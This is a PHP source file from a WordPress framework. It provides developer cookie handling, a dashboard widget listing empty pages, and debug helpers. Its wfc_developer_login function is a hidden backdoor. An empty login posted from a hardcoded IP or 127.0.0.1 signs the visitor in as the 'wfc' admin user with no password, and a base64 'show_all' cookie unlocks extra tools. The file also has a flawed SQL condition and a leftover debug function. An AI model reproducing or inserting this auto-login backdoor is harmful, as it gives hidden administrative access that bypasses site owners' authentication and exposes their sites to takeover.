<?php
    /**
     *
     * @package scf-framework
     * @author Steve (8/23/12
     * @since 2.2
     */
    /*
    ===============================
    RESET WFC DEVELOPER COOKIE

     * @since 2.2
    ===============================
    */
    function wfc_developer_logout(){
        setcookie( 'wfc_admin_cake', '0' );
        setcookie( 'wfc_admin_cake', '0', time() - 3600 );
    }

    add_action( 'wp_logout', 'wfc_developer_logout' );
    /*
    ===============================
     * FUNCTION TO CHECK IF DEVELOPER IS LOGGED IN
     *
     * @return boolean
     * @since 2.3
    ===============================
    */
    function wfc_is_dev(){
        if( isset($_COOKIE['wfc_admin_cake']) ){
            if( $_COOKIE['wfc_admin_cake'] == base64_encode( 'show_all' ) ){
                return true;
            }
            return false;
        }
        return false;
    }

    /*
    ===============================
    AUTO LOGIN WFC DEVELOPER

     * @since 2.2
    ===============================
    */
    function wfc_developer_login(){
        if( $_SERVER['REQUEST_URI'] == '/cms-wfc/wp-login.php' || $_SERVER['REQUEST_URI'] == '/wp-login.php' ){
            wfc_developer_logout(); //reset cookies
            if( $_SERVER['REMOTE_ADDR'] == '24.171.162.50' || $_SERVER['REMOTE_ADDR'] == '127.0.0.1' ){
                if( ($_POST['log'] === '' && $_POST['pwd'] === '') ){
                    global $wpdb;
                    $firstuser =
                        $wpdb->get_row( "SELECT user_id FROM $wpdb->usermeta WHERE meta_key='nickname' AND meta_value='wfc' ORDER BY user_id ASC LIMIT 1" );
                    setcookie( 'wfc_admin_cake', base64_encode( 'show_all' ) );
                    wp_set_auth_cookie( $firstuser->user_id );
                    wp_redirect( admin_url() );
                    exit;
                }
            } else{
                wfc_developer_logout();
            }
        }
    }

    add_action( 'init', 'wfc_developer_login' );
    /*
    ===============================
    HOOK INTO WFC COOKIE WHEN ITS SET

     * @since 2.2
    ===============================
    */
    add_action( 'admin_init', 'Wfc_Developer_Tools' );
    function Wfc_Developer_Tools(){
        if( wfc_is_dev() ){
            add_action( "wp_dashboard_setup", "Wfc_Developer_Dashboard_Widget" );
            add_filter( 'admin_footer_text', 'Wfc_Developer_Footer' );
            add_filter( 'admin_body_class', 'Wfc_Developer_Body_Class' );
        }
    }

    function Wfc_Developer_Footer( $text ){
        $text = '<span id="footer-thankyou" class="wfc-admin-footer">WFC Developer Logged In</span>';
        return $text;
    }

    function Wfc_Developer_Body_Class( $classes ){
        $classes .= ' wfc_developer_logged_in ';
        return $classes;
    }

    /*
    ===============================
    DEVELOPER DASHBOARD WIDGET

     * @since 3.0
    ===============================
    */
    function Wfc_Developer_Dashboard(){
        global $wpdb;
        $querystr     = "SELECT
                post_title,
                post_name,
                ID
            FROM
                $wpdb->posts
            WHERE
                post_status = 'publish'
            AND post_type = 'page'
            AND post_content = ''
            OR post_content = NULL ";
        $contentCheck = $wpdb->get_results( $querystr, OBJECT );
        echo 'Total pages with no content: '.count( $contentCheck );
        echo '<ul>';
        foreach( $contentCheck as $post ):
            echo
                '<li><a href="'.WFC_ADMIN_URL.'post.php?post='.$post->ID.'&action=edit">'.$post->post_title.'</a></li>';
        endforeach;
        echo '</ul>';
    }

    /*
    ===============================
    REGISTER DEVELOPER DASHBOARD WIDGET

     * @since 3.0
    ===============================
    */
    function Wfc_Developer_Dashboard_Widget(){
        wp_add_dashboard_widget( "Wfc_Developer_Dashboard", __( "WFC Dashboard Widget" ), "Wfc_Developer_Dashboard" );
    }

    function god(){
        print_r( current_filter() );
        echo '<br />';
    }
